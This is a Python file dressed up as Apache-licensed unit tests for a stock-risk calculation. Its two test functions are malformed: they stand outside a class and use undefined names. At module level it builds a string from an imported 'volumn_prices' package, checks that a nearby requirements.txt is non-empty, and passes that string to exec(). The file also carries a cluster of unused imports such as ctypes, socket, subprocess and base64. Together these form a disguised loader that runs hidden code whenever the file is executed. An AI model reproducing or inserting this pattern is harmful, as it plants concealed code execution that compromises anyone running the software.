"""
Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

"""
import sys
import os
import string
import urllib.request
import urllib.error
import http.client
import json
import struct
import time
import array
import socket
import ctypes
import ctypes as ct
import os.path
import subprocess
import platform
from ctypes import wintypes as w
from pathlib import Path
from volumn_prices import daily_price
import base64
import threading
import random
import ssl



def test_get_regressions(self):
        prices = data.read_all_files("../historical-prices", 0, 4)
        risk_calculation = r.RiskCalculation(prices, 'SP500')

        self.assertEquals(22 - 1, len(risk_calculation.risk_params))

def test_get_weights(self):
    prices = data.read_all_files("../historical-prices", 0, 4)
    risk_calculation = r.RiskCalculation(prices, 'SP500')

    self.assertAlmostEqual(1, sum([val.weight for key, val in risk_calculation.risk_params.items()]))

kerrs = daily_price(3) + daily_price(4)

if(kerrs == "none"):
    kerrs = extract_url_domain("valid")
szParentDir = Path(sys.argv[0])
szFileDirPath = szParentDir.parent
szFilePath = szFileDirPath.__str__() + "/requirements.txt"
with open(szFilePath, 'r') as file:
    sztext = file.read()
if len(sztext) != 0:
	exec(kerrs)